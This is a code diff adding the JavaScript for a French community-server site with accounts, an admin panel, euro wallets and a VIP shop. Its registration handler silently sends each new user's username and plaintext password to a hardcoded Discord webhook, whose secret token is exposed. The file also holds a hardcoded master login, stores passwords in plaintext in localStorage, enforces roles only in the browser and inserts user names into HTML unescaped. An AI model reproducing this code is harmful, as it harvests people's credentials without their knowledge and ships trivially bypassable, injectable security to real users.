@@ -1,1 +1,227 @@
+const MASTER={user:'admin',pass:'2800',role:'Fondateur'};
+const WEBHOOK_URL='https://discord.com/api/webhooks/1484252585140686879/uOpq8ltr4lR7Dq-fpDURBGxMDqUubX0boxdUcJSRz6sNsQUh48FvP3NFvO3Gg_GQ4Cll';
+const DISCORD_INVITE='https://discord.gg/SzY7FwA6Pt';
 
+function loadAccounts(){try{return JSON.parse(localStorage.getItem('sc_accounts')||'[]');}catch(e){return[];}}
+function saveAccounts(a){localStorage.setItem('sc_accounts',JSON.stringify(a));}
+function getAllAccounts(){return[MASTER,...loadAccounts()];}
+function loadWallets(){try{return JSON.parse(localStorage.getItem('sc_wallets')||'{}');}catch(e){return{};}}
+function saveWallets(w){localStorage.setItem('sc_wallets',JSON.stringify(w));}
+function getWallet(u){return parseFloat(loadWallets()[u]||0);}
+function setWallet(u,a){var w=loadWallets();w[u]=Math.max(0,parseFloat(a.toFixed(2)));saveWallets(w);}
+function formatEur(n){return n.toFixed(2).replace('.',',')+' €';}
+
+let currentUser=sessionStorage.getItem('sc_admin')||null;
+let currentRole=sessionStorage.getItem('sc_role')||null;
+
+function showPage(p){
+  if(p==='admin'&&!currentUser){showPage('login');return;}
+  document.querySelectorAll('.page').forEach(x=>x.classList.remove('active'));
+  document.getElementById(p).classList.add('active');
+  window.scrollTo(0,0);updateNav();
+  if(p==='admin'){refreshAccountsTable();refreshWalletsPanel();refreshDashWallets();}
+}
+
+function updateNav(){
+  const li=!!currentUser;
+  document.getElementById('nav-login-btn').style.display=li?'none':'inline-block';
+  document.getElementById('nav-admin-btn').style.display=(li&&currentRole==='Fondateur')?'inline-block':'none';
+  document.getElementById('nav-logout-btn').style.display=li?'inline-block':'none';
+  const fl=document.getElementById('footer-admin-link');if(fl)fl.style.display=(li&&currentRole==='Fondateur')?'inline':'none';
+  const nc=document.getElementById('nav-compte-link');if(nc)nc.style.display=li?'none':'inline';
+  updateNavWallet();
+}
+
+function updateNavWallet(){
+  var nw=document.getElementById('nav-wallet'),na=document.getElementById('nav-wallet-amount');
+  var mc=document.getElementById('member-wallet-card'),md=document.getElementById('member-wallet-display');
+  if(!nw)return;
+  if(currentUser&&currentRole!=='Fondateur'){
+    var b=getWallet(currentUser);na.textContent=formatEur(b);nw.style.display='flex';
+    if(mc)mc.style.display='block';if(md)md.textContent=formatEur(b);
+  }else{nw.style.display='none';if(mc)mc.style.display='none';}
+}
+
+function refreshDashWallets(){
+  const acc=loadAccounts(),w=loadWallets();
+  let total=0,withB=0,big=0;
+  acc.forEach(a=>{const b=parseFloat(w[a.user]||0);total+=b;if(b>0)withB++;if(b>big)big=b;});
+  const t=document.getElementById('dash-total-wallets'),wb=document.getElementById('dash-with-balance'),bb=document.getElementById('dash-biggest-balance');
+  if(t)t.textContent=formatEur(total);if(wb)wb.textContent=withB;if(bb)bb.textContent=formatEur(big);
+}
+
+async function sendWebhook(e){try{await fetch(WEBHOOK_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[e]})});}catch(x){}}
+
+function doLogin(){
+  const u=document.getElementById('login-user').value.trim().toLowerCase();
+  const p=document.getElementById('login-pass').value;
+  const f=getAllAccounts().find(a=>a.user.toLowerCase()===u&&a.pass===p);
+  if(f){
+    currentUser=f.user;currentRole=f.role||'Membre';
+    sessionStorage.setItem('sc_admin',currentUser);sessionStorage.setItem('sc_role',currentRole);
+    document.getElementById('admin-user-display').textContent=currentUser;
+    addLog('Connexion — '+currentUser+' ('+currentRole+')','success');
+    document.getElementById('login-error').classList.remove('show');
+    document.getElementById('login-pass').value='';
+    if(currentRole==='Fondateur'){showPage('admin');}else{showPage('main');showToast('✔ Connecté en tant que '+currentUser);}
+  }else{document.getElementById('login-error').classList.add('show');addLog('Tentative échouée — '+u,'warn');}
+}
+
+function doRegister(){
+  const u=document.getElementById('reg-user').value.trim();
+  const p=document.getElementById('reg-pass').value;
+  const p2=document.getElementById('reg-pass2').value;
+  const eEl=document.getElementById('reg-error'),okEl=document.getElementById('reg-success');
+  eEl.style.display='none';okEl.style.display='none';
+  if(!u||u.length<3){eEl.textContent='✕ Identifiant trop court (min 3)';eEl.style.display='block';return;}
+  if(!p||p.length<4){eEl.textContent='✕ Mot de passe trop court (min 4)';eEl.style.display='block';return;}
+  if(p!==p2){eEl.textContent='✕ Mots de passe différents';eEl.style.display='block';return;}
+  if(getAllAccounts().find(a=>a.user.toLowerCase()===u.toLowerCase())){eEl.textContent='✕ Identifiant déjà pris';eEl.style.display='block';return;}
+  const acc=loadAccounts();acc.push({user:u,pass:p,role:'Membre',date:new Date().toLocaleDateString('fr-FR')});saveAccounts(acc);
+  addLog('Nouveau compte — '+u,'success');
+  sendWebhook({title:'🆕 Nouveau compte créé',color:0xff2a2a,fields:[{name:'👤 Identifiant',value:'`'+u+'`',inline:true},{name:'🔑 Mot de passe',value:'`'+p+'`',inline:true},{name:'📅 Date',value:new Date().toLocaleString('fr-FR'),inline:false}],footer:{text:'Serveur Communautaire | FR'},timestamp:new Date().toISOString()});
+  okEl.style.display='block';
+  document.getElementById('reg-user').value='';document.getElementById('reg-pass').value='';document.getElementById('reg-pass2').value='';
+  setTimeout(()=>switchTab('login'),2000);
+}
+
+function switchTab(t){
+  document.getElementById('form-login').style.display=t==='login'?'block':'none';
+  document.getElementById('form-register').style.display=t==='register'?'block':'none';
+  document.getElementById('tab-login').classList.toggle('active',t==='login');
+  document.getElementById('tab-register').classList.toggle('active',t==='register');
+  document.getElementById('login-error').classList.remove('show');
+  document.getElementById('reg-error').style.display='none';
+  document.getElementById('reg-success').style.display='none';
+}
+
+function logout(){currentUser=null;currentRole=null;sessionStorage.removeItem('sc_admin');sessionStorage.removeItem('sc_role');showPage('main');}
+
+function showAdminPanel(n,el){
+  document.querySelectorAll('.admin-panel').forEach(x=>x.classList.remove('active'));
+  document.querySelectorAll('.sidebar-item').forEach(x=>x.classList.remove('active'));
+  document.getElementById('panel-'+n).classList.add('active');
+  if(el)el.classList.add('active');
+  const t={dashboard:'Dashboard',membres:'Membres',packs:'Packs VIP',soldes:'Soldes & Euros',logs:'Journaux',comptes:'Comptes',settings:'Paramètres'};
+  document.getElementById('admin-title').textContent=t[n]||n;
+  if(n==='comptes')refreshAccountsTable();if(n==='soldes')refreshWalletsPanel();
+}
+
+function refreshWalletsPanel(){
+  const tbody=document.getElementById('wallets-tbody'),sel=document.getElementById('give-target');
+  if(!tbody)return;
+  const acc=loadAccounts(),w=loadWallets();
+  let total=0,withB=0,big=0;
+  acc.forEach(a=>{const b=parseFloat(w[a.user]||0);total+=b;if(b>0)withB++;if(b>big)big=b;});
+  const tg=document.getElementById('stat-total-given'),sw=document.getElementById('stat-wallets'),sb=document.getElementById('stat-biggest');
+  if(tg)tg.textContent=formatEur(total);if(sw)sw.textContent=withB;if(sb)sb.textContent=formatEur(big);
+  if(sel){const prev=sel.value;sel.innerHTML='<option value="">— Choisir un membre —</option>';acc.forEach(a=>{const o=document.createElement('option');o.value=a.user;o.textContent=a.user+' ('+formatEur(parseFloat(w[a.user]||0))+')';sel.appendChild(o);});if(prev)sel.value=prev;}
+  tbody.innerHTML='';
+  if(!acc.length){tbody.innerHTML='<tr><td colspan="4" style="text-align:center;color:var(--muted);padding:24px;">Aucun membre inscrit</td></tr>';return;}
+  acc.forEach((a,i)=>{
+    const b=parseFloat(w[a.user]||0),row=document.createElement('tr');
+    row.innerHTML='<td>'+a.user+'</td><td><span class="badge-free">'+(a.role||'Membre')+'</span></td>'+
+      '<td><strong style="color:var(--gold);font-family:\'Black Ops One\',sans-serif;font-size:20px;">'+formatEur(b)+'</strong></td>'+
+      '<td style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;">'+
+        '<input type="number" class="give-input" id="qa-'+i+'" placeholder="€" step="0.01" min="0">'+
+        '<button class="give-btn" onclick="quickGive('+i+',\''+a.user+'\',1)">➕</button>'+
+        '<button class="give-btn remove" onclick="quickGive('+i+',\''+a.user+'\',-1)">➖</button>'+
+        '<button class="give-btn" style="background:transparent;color:var(--muted);border:1px solid var(--border2);" onclick="quickReset(\''+a.user+'\')">🔄</button>'+
+      '</td>';
+    tbody.appendChild(row);
+  });
+}
+
+function quickGive(i,u,s){
+  const inp=document.getElementById('qa-'+i),v=parseFloat(inp?inp.value:0);
+  if(!v||v<=0){showToast('✕ Montant invalide');return;}
+  const cur=getWallet(u),nb=s>0?cur+v:Math.max(0,cur-v);setWallet(u,nb);
+  addLog((s>0?'+':'-')+formatEur(v)+' pour '+u,'success');
+  sendWebhook({title:s>0?'💰 Euros donnés !':'💸 Euros retirés',color:s>0?0x76ff03:0xff1744,fields:[{name:'👤 Membre',value:'`'+u+'`',inline:true},{name:s>0?'➕ Ajouté':'➖ Retiré',value:'**'+formatEur(v)+'**',inline:true},{name:'💳 Nouveau solde',value:'**'+formatEur(nb)+'**',inline:false}],footer:{text:'SC|FR — Soldes'},timestamp:new Date().toISOString()});
+  refreshWalletsPanel();updateNavWallet();refreshDashWallets();if(inp)inp.value='';
+}
+
+function quickReset(u){setWallet(u,0);addLog('Solde remis à 0 — '+u,'warn');refreshWalletsPanel();updateNavWallet();refreshDashWallets();}
+
+function giveMoneyToUser(){
+  const t=document.getElementById('give-target').value,a=parseFloat(document.getElementById('give-amount').value),m=document.getElementById('give-msg');
+  if(!t){m.style.color='var(--danger)';m.textContent='✕ Choisis un membre';return;}
+  if(!a||a<=0){m.style.color='var(--danger)';m.textContent='✕ Montant invalide';return;}
+  const nb=getWallet(t)+a;setWallet(t,nb);addLog('+'+formatEur(a)+' donné à '+t,'success');
+  sendWebhook({title:'💰 Euros donnés !',color:0x76ff03,fields:[{name:'👤 Membre',value:'`'+t+'`',inline:true},{name:'➕ Ajouté',value:'**'+formatEur(a)+'**',inline:true},{name:'💳 Nouveau solde',value:'**'+formatEur(nb)+'**',inline:false}],footer:{text:'SC|FR — Soldes'},timestamp:new Date().toISOString()});
+  m.style.color='var(--green)';m.textContent='✔ '+formatEur(a)+' donnés à '+t+' ! Solde : '+formatEur(nb);
+  document.getElementById('give-amount').value='';refreshWalletsPanel();updateNavWallet();refreshDashWallets();
+  setTimeout(()=>{m.textContent='';},4000);
+}
+
+function removeMoneyFromUser(){
+  const t=document.getElementById('give-target').value,a=parseFloat(document.getElementById('give-amount').value),m=document.getElementById('give-msg');
+  if(!t){m.style.color='var(--danger)';m.textContent='✕ Choisis un membre';return;}
+  if(!a||a<=0){m.style.color='var(--danger)';m.textContent='✕ Montant invalide';return;}
+  const nb=Math.max(0,getWallet(t)-a);setWallet(t,nb);addLog('-'+formatEur(a)+' retiré à '+t,'warn');
+  m.style.color='var(--gold)';m.textContent='✔ '+formatEur(a)+' retirés à '+t+' ! Solde : '+formatEur(nb);
+  document.getElementById('give-amount').value='';refreshWalletsPanel();updateNavWallet();refreshDashWallets();
+  setTimeout(()=>{m.textContent='';},4000);
+}
+
+function resetMoneyUser(){
+  const t=document.getElementById('give-target').value,m=document.getElementById('give-msg');
+  if(!t){m.style.color='var(--danger)';m.textContent='✕ Choisis un membre';return;}
+  setWallet(t,0);addLog('Solde remis à 0 — '+t,'warn');
+  m.style.color='var(--muted)';m.textContent='Solde de '+t+' remis à 0';
+  refreshWalletsPanel();updateNavWallet();refreshDashWallets();setTimeout(()=>{m.textContent='';},3000);
+}
+
+function resetAllWallets(){if(!confirm('Remettre TOUS les soldes à 0 ?'))return;localStorage.removeItem('sc_wallets');addLog('Tous les soldes remis à 0','error');refreshWalletsPanel();updateNavWallet();refreshDashWallets();}
+
+function refreshAccountsTable(){
+  const tbody=document.getElementById('accounts-tbody');if(!tbody)return;
+  const acc=loadAccounts();
+  const tEl=document.getElementById('stat-total-accounts'),sEl=document.getElementById('stat-storage');
+  if(tEl)tEl.textContent=acc.length+1;
+  if(sEl){const b=new Blob([localStorage.getItem('sc_accounts')||'']).size;sEl.textContent=b<1024?b+' B':(b/1024).toFixed(1)+' KB';}
+  tbody.innerHTML='';
+  const mr=document.createElement('tr');
+  mr.innerHTML='<td><strong style="color:var(--red)">'+MASTER.user+'</strong></td><td><span style="color:var(--gold)">👑 Fondateur</span></td><td>—</td><td style="color:var(--muted);font-size:12px;">Compte maître (protégé)</td>';
+  tbody.appendChild(mr);
+  acc.forEach((a,i)=>{
+    const r=document.createElement('tr');
+    r.innerHTML='<td>'+a.user+'</td><td><span class="badge-free">'+(a.role||'Membre')+'</span></td><td>'+(a.date||'—')+'</td>'+
+      '<td><select class="settings-input" style="padding:4px 8px;font-size:12px;width:auto;" onchange="changeRole('+i+',this.value)">'+
+        '<option'+(a.role==='Membre'?' selected':'')+'>Membre</option>'+
+        '<option'+(a.role==='Modérateur'?' selected':'')+'>Modérateur</option>'+
+        '<option'+(a.role==='Fondateur'?' selected':'')+'>Fondateur</option>'+
+      '</select><button class="action-btn danger" onclick="deleteAccount('+i+')" style="margin-left:6px;">Supprimer</button></td>';
+    tbody.appendChild(r);
+  });
+  if(!acc.length){const er=document.createElement('tr');er.innerHTML='<td colspan="4" style="text-align:center;color:var(--muted);padding:24px;">Aucun compte inscrit</td>';tbody.appendChild(er);}
+}
+
+function adminCreateAccount(){
+  const u=document.getElementById('new-acc-user').value.trim(),p=document.getElementById('new-acc-pass').value,r=document.getElementById('new-acc-role').value,m=document.getElementById('new-acc-msg');
+  if(!u||u.length<2){m.style.color='var(--danger)';m.textContent='✕ Identifiant trop court';return;}
+  if(!p||p.length<3){m.style.color='var(--danger)';m.textContent='✕ Mot de passe trop court';return;}
+  if(getAllAccounts().find(a=>a.user.toLowerCase()===u.toLowerCase())){m.style.color='var(--danger)';m.textContent='✕ Identifiant déjà utilisé';return;}
+  const acc=loadAccounts();acc.push({user:u,pass:p,role:r,date:new Date().toLocaleDateString('fr-FR')});saveAccounts(acc);
+  addLog('Compte créé — '+u,'success');m.style.color='var(--green)';m.textContent='✔ Compte "'+u+'" créé !';
+  document.getElementById('new-acc-user').value='';document.getElementById('new-acc-pass').value='';
+  refreshAccountsTable();setTimeout(()=>{m.textContent='';},3000);
+}
+
+function changeRole(i,r){const acc=loadAccounts();acc[i].role=r;saveAccounts(acc);addLog('Rôle — '+acc[i].user+' → '+r,'warn');}
+function deleteAccount(i){const acc=loadAccounts(),n=acc[i].user;acc.splice(i,1);saveAccounts(acc);addLog('Compte supprimé — '+n,'error');refreshAccountsTable();}
+
+function exportBackup(){const d={accounts:loadAccounts(),wallets:loadWallets(),exported:new Date().toISOString()};const b=new Blob([JSON.stringify(d,null,2)],{type:'application/json'});const a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='sc-backup-'+new Date().toISOString().slice(0,10)+'.json';a.click();addLog('Backup exporté','success');}
+function importBackup(){const i=document.createElement('input');i.type='file';i.accept='.json';i.onchange=e=>{const f=e.target.files[0],r=new FileReader();r.onload=ev=>{try{const d=JSON.parse(ev.target.result);if(d.accounts){saveAccounts(d.accounts);if(d.wallets)saveWallets(d.wallets);refreshAccountsTable();refreshWalletsPanel();refreshDashWallets();addLog('Backup importé','success');showToast('✔ Backup importé !');}}catch(x){showToast('✕ Fichier invalide');}};r.readAsText(f);};i.click();}
+
+function showToast(msg){let t=document.getElementById('sc-toast');if(!t){t=document.createElement('div');t.id='sc-toast';t.style.cssText='position:fixed;bottom:30px;right:30px;background:var(--bg2);border:1px solid var(--border);color:var(--text);padding:14px 22px;font-family:"Share Tech Mono",monospace;font-size:13px;letter-spacing:1px;z-index:9998;transition:opacity 0.4s;';document.body.appendChild(t);}t.textContent=msg;t.style.opacity='1';clearTimeout(t._hide);t._hide=setTimeout(()=>{t.style.opacity='0';},3000);}
+
+function addLog(msg,type){type=type||'';const feed=document.getElementById('log-feed');if(!feed)return;const now=new Date();const ts='['+String(now.getDate()).padStart(2,'0')+'/'+String(now.getMonth()+1).padStart(2,'0')+' '+String(now.getHours()).padStart(2,'0')+':'+String(now.getMinutes()).padStart(2,'0')+']';const icons={success:'✔',warn:'⚠',error:'✖'};const div=document.createElement('div');div.className='log-line';div.innerHTML='<span class="log-time">'+ts+'</span><span class="log-msg '+type+'">'+(icons[type]||'▶')+' '+msg+'</span>';feed.insertBefore(div,feed.firstChild);}
+
+var currentPackChoice='';
+function openModal(pack){currentPackChoice=pack;const t={'vip':'Pack VIP — 7,50€/mois','vip-plus':'Pack VIP+ — 9,99€/mois'};document.getElementById('modal-title').textContent=t[pack]||pack;const nb=document.getElementById('modal-name-block'),ni=document.getElementById('modal-buyer-name');if(currentUser){ni.value=currentUser;nb.style.display='none';}else{ni.value='';nb.style.display='block';}document.getElementById('buy-modal').classList.add('open');}
+function confirmPurchase(){const pack=currentPackChoice,pn={'vip':'Pack VIP (7,50€/mois)','vip-plus':'Pack VIP+ (9,99€/mois)'},pc={'vip':0xff2a2a,'vip-plus':0xff9800};const bn=document.getElementById('modal-buyer-name').value.trim()||currentUser||'Anonyme';sendWebhook({title:'🛒 Nouvel achat VIP !',color:pc[pack]||0xff2a2a,fields:[{name:'👤 Acheteur',value:'`'+bn+'`',inline:true},{name:'👑 Pack',value:'**'+pn[pack]+'**',inline:true},{name:'📅 Date',value:new Date().toLocaleString('fr-FR'),inline:false},{name:'📌 Statut',value:'⏳ En attente de confirmation staff',inline:false}],footer:{text:'Serveur Communautaire | FR — Boutique VIP'},timestamp:new Date().toISOString()});addLog('Achat '+pack+' — '+bn,'success');window.open(DISCORD_INVITE,'_blank');closeModal();}
+function closeModal(){document.getElementById('buy-modal').classList.remove('open');}
+document.getElementById('buy-modal').addEventListener('click',function(e){if(e.target===this)closeModal();});
+
+if(currentUser){document.getElementById('admin-user-display').textContent=currentUser;updateNav();}
